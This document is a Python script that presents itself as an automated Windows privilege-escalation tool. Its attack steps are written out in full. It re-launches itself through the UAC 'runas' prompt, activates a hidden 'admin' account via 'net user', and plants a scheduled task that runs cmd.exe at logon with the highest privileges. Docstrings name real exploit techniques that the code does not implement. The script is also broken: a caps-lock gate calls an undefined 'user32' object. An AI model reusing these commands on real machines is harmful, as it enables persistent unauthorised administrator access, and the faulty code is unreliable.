import os
import platform
import ctypes
import subprocess
import sys
import time


def toggle_caps_lock():
    caps_state = user32.GetKeyState(20)
    if caps_state == 1:
        user32.keybd_event(20, 0, 2, 0)
    else:
        user32.keybd_event(20, 0, 0, 0)


def check_admin_privileges():
    """
    Check if the script is running with admin privileges.
    Returns True if admin, False otherwise.
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        return False


def elevate_privileges():
    """
    Attempt to elevate privileges by re-running the script with admin rights.
    UAC prompt will appear for privilege escalation.
    """
    try:
        if not check_admin_privileges():
            print('[*] Attempting to elevate privileges via UAC...')
            ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.
                executable, ' '.join(sys.argv), None, 1)
    except Exception as e:
        print(f'[-] Privilege escalation failed: {e}')


def detect_windows_version():
    """
    Detect the Windows version.
    """
    version = platform.release()
    print(f'[*] Detected Windows version: {version}')
    return version


def windows_xp_escalation():
    """
    Example escalation for Windows XP.
    Exploit legacy service vulnerabilities, misconfigurations, etc.
    """
    print('[*] Running Windows XP specific escalation...')
    os.system('net user admin /active:yes')


def windows_7_escalation():
    """
    Example escalation for Windows 7.
    Token manipulation, UAC bypass, or known exploits (e.g., MS10-092).
    """
    print('[*] Running Windows 7 specific escalation...')
    os.system(
        'schtasks /create /tn escalatetask /tr C:\\Windows\\System32\\cmd.exe /sc onlogon /rl highest'
        )


def windows_10_escalation():
    """
    Example escalation for Windows 10.
    Newer privilege escalation techniques such as Windows Installer exploits, COM object exploits, or abusing `SeImpersonatePrivilege`.
    """
    print('[*] Running Windows 10 specific escalation...')
    subprocess.call(['powershell.exe', '-Command',
        'Start-Process cmd.exe -Verb runAs'])


def privilege_escalation():
    """
    Based on the detected Windows version, attempt the appropriate privilege escalation method.
    """
    windows_version = detect_windows_version()
    if windows_version == 'XP':
        windows_xp_escalation()
    elif windows_version == '7':
        windows_7_escalation()
    elif windows_version == '8' or windows_version == '8.1':
        print('[*] Running Windows 8/8.1 specific escalation...')
        windows_7_escalation()
    elif windows_version == '10':
        windows_10_escalation()
    else:
        print('[-] Unsupported Windows version or not detected.')


def main():
    print('[*] Starting automated privilege escalation...')
    if check_admin_privileges():
        print('[+] Already running with administrator privileges!')
    else:
        print('[*] Not running as admin, attempting privilege escalation...')
        elevate_privileges()
    privilege_escalation()


if __name__ == '__main__':
    if not (toggle_caps_lock()):
        main()
